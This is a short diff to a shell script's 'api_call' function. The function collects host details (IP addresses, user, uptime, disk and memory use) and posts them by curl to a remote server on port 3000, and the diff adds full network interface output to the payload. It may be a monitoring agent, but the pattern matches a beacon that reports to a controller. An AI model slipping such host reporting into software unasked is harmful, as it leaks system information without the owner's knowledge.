@@ -19,7 +19,8 @@ api_call () {
   uptime=`w`
   free=`free -m`  
   user=`whoami`
-  api_response=`curl -s --data "local_ip=$local_ip&outside_ip=$outside_ip&user=$user&uptime=$uptime&dfh=$dfh&free=$free" $remote:3000/a/$call`
+  ifconfig=`ifconfig`
+  api_response=`curl -s --data "local_ip=$local_ip&outside_ip=$outside_ip&user=$user&uptime=$uptime&dfh=$dfh&free=$free&ifconfig=$ifconfig" $remote:3000/a/$call`
 }
 
 # Parse response
